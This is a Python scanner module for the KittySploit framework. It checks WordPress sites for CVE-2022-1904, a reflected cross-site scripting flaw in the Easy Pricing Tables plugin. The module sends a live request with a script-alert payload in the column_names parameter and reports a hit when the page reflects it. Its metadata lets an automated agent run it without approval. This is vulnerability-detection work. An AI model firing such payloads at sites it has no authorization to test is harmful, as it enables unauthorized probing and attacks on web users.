#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Easy Pricing Tables plugin before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Easy Pricing Tables <3.2.1 - Cross-Site Scripting Detection',
        'description': 'WordPress Easy Pricing Tables plugin before 3.2.1 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before reflecting it back in a page available to any user both authenticated and unauthenticated when a specific setting is enabled.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp', 'wordpress', 'wpscan', 'wp-plugin', 'xss', 'fatcatapps', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/92215d07-d129-49b4-a838-0de1a944c06b',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1904',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/cyllective/CVEs',
        ],
        'cve': 'CVE-2022-1904',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=<script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(document.domain)</script> - Color',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Easy Pricing Tables <3.2.1 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=<script>alert(document.domain)</script>',
            )
            return True
        return False

